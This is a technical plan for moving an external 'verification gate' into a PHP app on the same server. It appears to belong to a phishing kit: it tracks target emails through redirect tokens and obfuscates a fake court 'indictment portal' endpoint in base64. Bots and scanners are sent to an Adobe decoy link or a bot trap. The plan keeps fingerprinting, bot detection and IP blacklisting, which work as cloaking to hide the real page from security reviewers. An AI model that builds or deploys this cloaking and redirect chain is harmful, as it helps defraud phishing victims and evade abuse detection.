# Verification Gate Embedding Plan

## Overview
Embed `github/index.html` (verification gate) directly into the app so everything can be hosted on the same server instead of requiring a separate server.

## Current Flow Analysis

### Current Flow (Separate Server):
```
1. github/index.html (external server)
   ↓ (bot detection, fingerprint collection)
2. api.php (POST request)
   ↓ (returns token: md5(type:timestamp:gate_secret_salt))
3. process.php?key=TOKEN&type=human|denied&ref=EMAIL
   ↓ (validates token, generates vtoken/vtime)
4. router.php?vtoken=...&vtime=...&ref=EMAIL
   ↓ (gets destination URL from utils.js)
5. destination/index.php?vtoken=...&vtime=...&ref=EMAIL
   ↓ (validates vtoken/vtime)
6. Main app loads
```

### New Flow (Same Server):
```
1. verification_gate.php (local)
   ↓ (bot detection, fingerprint collection)
2. api.php (POST request - local)
   ↓ (returns token: md5(type:timestamp:gate_secret_salt))
3. process.php?key=TOKEN&type=human|denied&ref=EMAIL (local)
   ↓ (validates token, generates vtoken/vtime)
4. index.php?vtoken=...&vtime=...&ref=EMAIL (local)
   ↓ (validates vtoken/vtime)
5. Main app loads
```

## Implementation Steps

### Step 1: Create `verification_gate.php`
**File**: `verification_gate.php` (new file in root)

**Changes needed**:
1. Copy HTML/CSS/JS from `github/index.html`
2. Update endpoint URLs:
   - Change: `atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3J0YWwub25saW5lL2FwaS5waHA=")` 
   - To: `'api.php'` (relative path)
3. Update redirect base:
   - Change: `atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3J0YWwub25saW5lL3Byb2Nlc3MucGhw")`
   - To: `'process.php'` (relative path)
4. Keep all bot detection logic intact
5. Keep fingerprint collection intact
6. Keep reCAPTCHA integration intact

**Functions to preserve**:
- `detectAutomation()`
- `checkBotUserAgent()`
- `validateBrowserEnvironment()`
- `showBotTrap()`
- `collectFingerprint()`
- `checkWebGL()`
- `getCanvasFingerprint()`
- `solveChallenge()`
- `getRecaptchaToken()`

### Step 2: Update `process.php`
**File**: `process.php` (modify existing)

**Changes needed**:
1. Update redirect URL for 'human' type:
   - Change: `'router.php?vtoken=' . $verification_token . '&vtime=' . time()`
   - To: `'index.php?vtoken=' . $verification_token . '&vtime=' . time()`
2. Preserve email parameter (`ref`):
   - Check for `$_GET['ref']` parameter
   - Append to redirect URL: `&ref=' . urlencode($_GET['ref'])`
3. Keep all token validation logic intact
4. Keep all blacklist checks intact

**Functions to preserve**:
- Token validation loop (checking past 60 seconds)
- Token generation: `md5('verified:' . time() . ':secure_gate_salt')`
- IP blacklist check
- Device detection (if needed)

### Step 3: Update `index.php`
**File**: `index.php` (modify existing)

**Changes needed**:
1. Update redirect URL when no token:
   - Change: `header('Location: https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');`
   - To: `header('Location: verification_gate.php');`
2. Preserve email parameter handling:
   - Already handles `?ref=...` parameter via `extractEmailFromFragment()`
   - No changes needed for email extraction
3. Keep all token validation logic intact

**Functions to preserve**:
- Token validation: `md5('verified:' . $vtime . ':secure_gate_salt')`
- Token format check (32-char MD5)
- Timestamp validation (60 second window)
- IP blacklist check

### Step 4: Update `api.php` (if needed)
**File**: `api.php` (verify compatibility)

**Changes needed**:
1. Verify CORS headers allow local requests:
   - Current: `header('Access-Control-Allow-Origin: *');`
   - This should work for same-origin requests
2. Verify token generation matches:
   - Current: `md5(type:timestamp:gate_secret_salt)`
   - Must match what `process.php` expects
3. Keep all bot detection logic intact
4. Keep all fingerprint validation intact

**Functions to preserve**:
- `generateRedirectToken()` - generates `md5(type:timestamp:gate_secret_salt)`
- `AdvancedAntibotSystem::detectBot()`
- reCAPTCHA validation
- IP visit tracking
- Blacklist checks

### Step 5: Remove/Update `router.php` (optional)
**File**: `router.php` (may not be needed)

**Decision**: 
- If `process.php` redirects directly to `index.php`, `router.php` may not be needed
- However, if you want to keep the router for destination URL management, keep it
- Update `process.php` to redirect to `router.php` if router is still needed

## Files to Create/Modify

### New Files:
1. **`verification_gate.php`** - Embedded verification gate (from github/index.html)

### Files to Modify:
1. **`process.php`** - Update redirect URL to point to `index.php` instead of `router.php`
2. **`index.php`** - Update redirect URL to point to `verification_gate.php` instead of external URL

### Files to Verify (No Changes Expected):
1. **`api.php`** - Should work as-is (verify CORS and token generation)
2. **`router.php`** - May not be needed if process.php redirects directly to index.php

## Token Flow Details

### Token 1: API Token (from api.php)
- **Format**: `md5(type:timestamp:gate_secret_salt)`
- **Example**: `md5('human:1234567890:gate_secret_salt')`
- **Used in**: `process.php?key=TOKEN&type=human`
- **Validation**: `process.php` checks if token matches any timestamp in past 60 seconds

### Token 2: Verification Token (from process.php)
- **Format**: `md5('verified:' . time() . ':secure_gate_salt')`
- **Example**: `md5('verified:1234567890:secure_gate_salt')`
- **Used in**: `index.php?vtoken=TOKEN&vtime=TIMESTAMP`
- **Validation**: `index.php` regenerates token from `vtime` and compares

## Email Parameter Flow

### Current Flow:
1. `github/index.html` extracts email from `?ref=...` or `#email=...`
2. Redirects to `process.php?key=TOKEN&type=human&ref=EMAIL`
3. `process.php` redirects to `router.php?vtoken=...&vtime=...&ref=EMAIL`
4. `router.php` redirects to `index.php?vtoken=...&vtime=...&ref=EMAIL`
5. `index.php` uses `extractEmailFromFragment()` which checks `?ref=...` first

### New Flow:
1. `verification_gate.php` extracts email from `?ref=...` or `#email=...`
2. Redirects to `process.php?key=TOKEN&type=human&ref=EMAIL`
3. `process.php` redirects to `index.php?vtoken=...&vtime=...&ref=EMAIL`
4. `index.php` uses `extractEmailFromFragment()` which checks `?ref=...` first

**No changes needed** - email parameter is already preserved through the chain.

## Configuration Requirements

### Secret Salts (Must Match):
1. **`gate_secret_salt`** - Used in `api.php` and `process.php` for API token generation
2. **`secure_gate_salt`** - Used in `process.php` and `index.php` for verification token generation

**Action**: Verify both salts are consistent across files.

### reCAPTCHA Configuration:
- **Site Key**: `6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k`
- **Config Source**: `https://campbellchamblissappraisers.com/config_recaptcha_public.php`
- **Action**: Either:
  - Keep external config source (if accessible)
  - Or create local `config_recaptcha_public.php` with same structure

## Testing Checklist

### Test Cases:
1. ✅ Direct access to `verification_gate.php` - should load
2. ✅ Bot detection - should block obvious bots
3. ✅ Fingerprint collection - should work
4. ✅ API call to `api.php` - should return token
5. ✅ Redirect to `process.php` - should validate token
6. ✅ Redirect to `index.php` - should validate vtoken/vtime
7. ✅ Email parameter preservation - should work through entire chain
8. ✅ Base64 email support - should decode correctly
9. ✅ Mobile device support - should work
10. ✅ Token expiry - should reject expired tokens

## Implementation Order

1. **First**: Create `verification_gate.php` (test independently)
2. **Second**: Update `process.php` redirect URL
3. **Third**: Update `index.php` redirect URL
4. **Fourth**: Test complete flow end-to-end
5. **Fifth**: Remove/update `router.php` if not needed

## Security Considerations

1. **CORS**: `api.php` already allows `*` origin - should work for same-origin
2. **Token Timing**: Both tokens have 60-second expiry windows
3. **IP Blacklisting**: Already integrated in all files
4. **Bot Detection**: All detection logic preserved
5. **Secret Salts**: Must remain consistent across files

## Rollback Plan

If issues occur:
1. Revert `index.php` redirect URL to external URL
2. Revert `process.php` redirect URL to `router.php`
3. Keep `verification_gate.php` for future use

## Notes

- `router.php` may still be needed if you want to route to different destination URLs
- If removing `router.php`, ensure `process.php` redirects directly to `index.php`
- Email parameter (`ref`) is already handled correctly through the chain
- All bot detection and security features are preserved

